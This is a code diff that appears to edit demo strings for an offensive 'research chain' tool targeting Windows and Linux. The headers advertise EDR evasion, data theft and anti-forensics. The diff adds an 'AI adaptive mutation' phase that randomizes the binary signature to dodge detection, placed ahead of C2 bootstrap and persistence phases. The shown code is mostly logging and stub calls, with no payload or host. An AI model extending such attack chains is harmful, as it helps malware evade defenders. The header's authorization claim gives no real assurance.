@@ -1,4 +1,5 @@
-WINDOWS_DEMO = r"""// JOCKY Windows Research Chain v4 - Enterprise Production
+WINDOWS_DEMO = r"""
+// JOCKY Windows Research Chain v4 - Enterprise Production
 // 50+ Runtime APIs | Complete EDR Evasion | Forensics | Data Theft | Anti-Forensics
 // Authorized: Red Hat + IIT Bombay Cyber Security Team
 
@@ -128,6 +129,37 @@ fn phase_evasion() -> bool {
     }
 
     println("[+] EDR Evasion: 11 techniques deployed")
+    println("")
+    return true
+}
+
+// ===== PHASE 0.5: AI ADAPTIVE MUTATION =====
+fn phase_ai_mutation() -> bool {
+    println("[*] Phase 0.5: AI Adaptive Code Mutation")
+
+    let init_ok = ai_init()
+    if init_ok != 0 {
+        println("    [-] AI engine init failed (non-critical, using heuristic fallback)")
+    } else {
+        println("    [+] AI threat engine initialized")
+    }
+
+    let threat_score = ai_score_threat()
+    println("    [*] Threat score: " + string(threat_score))
+
+    if threat_score > 0.25 {
+        println("    [!] Threat detected - applying runtime code mutations")
+        let result = ai_apply_mutation()
+        if result == 0 {
+            println("    [+] Code mutations applied: NOP variation, instruction re-encoding")
+            println("    [+] Binary signature randomized at runtime")
+        } else {
+            println("    [-] Mutation pass returned error (non-critical)")
+        }
+    } else {
+        println("    [+] Low threat environment - baseline operation")
+    }
+
     println("")
     return true
 }
@@ -534,6 +566,9 @@ fn main() -> i32 {
         return 1
     }
 
+    // Phase 0.5: AI Mutation
+    let _ = phase_ai_mutation()
+
     // Phase 1: C2
     let _ = phase_c2_bootstrap()
 
@@ -578,9 +613,11 @@ fn main() -> i32 {
     println("[*] Persistence: " + string(persistence_set))
 
     return 0
-}"""
+}
+"""
 
-LINUX_DEMO = r"""// JOCKY Linux Research Chain v4 - Enterprise Production
+LINUX_DEMO = r"""
+// JOCKY Linux Research Chain v4 - Enterprise Production
 // 50+ Runtime APIs | Kernel Exploitation | Forensics | Data Theft | Anti-Forensics
 // Authorized: Red Hat + IIT Bombay Cyber Security Team
 
@@ -644,6 +681,37 @@ fn phase_anti_analysis() -> bool {
     }
 
     println("[+] Anti-analysis phase complete")
+    println("")
+    return true
+}
+
+// ===== PHASE 0.5: AI ADAPTIVE MUTATION =====
+fn phase_ai_mutation() -> bool {
+    println("[*] Phase 0.5: AI Adaptive Code Mutation")
+
+    let init_ok = ai_init()
+    if init_ok != 0 {
+        println("    [-] AI engine init failed (non-critical, using heuristic fallback)")
+    } else {
+        println("    [+] AI threat engine initialized")
+    }
+
+    let threat_score = ai_score_threat()
+    println("    [*] Threat score: " + string(threat_score))
+
+    if threat_score > 0.25 {
+        println("    [!] Threat detected - applying runtime code mutations")
+        let result = ai_apply_mutation()
+        if result == 0 {
+            println("    [+] Code mutations applied: NOP variation, instruction re-encoding")
+            println("    [+] Binary signature randomized at runtime")
+        } else {
+            println("    [-] Mutation pass returned error (non-critical)")
+        }
+    } else {
+        println("    [+] Low threat environment - baseline operation")
+    }
+
     println("")
     return true
 }
@@ -1140,6 +1208,9 @@ fn main() -> i32 {
         return 1
     }
 
+    // Phase 0.5: AI Mutation
+    let _ = phase_ai_mutation()
+
     // Phase 1: C2
     let _ = phase_c2_bootstrap()
 
@@ -1184,4 +1255,5 @@ fn main() -> i32 {
     println("[*] Persistence: " + string(persistence_set))
 
     return 0
-}"""
+}
+"""
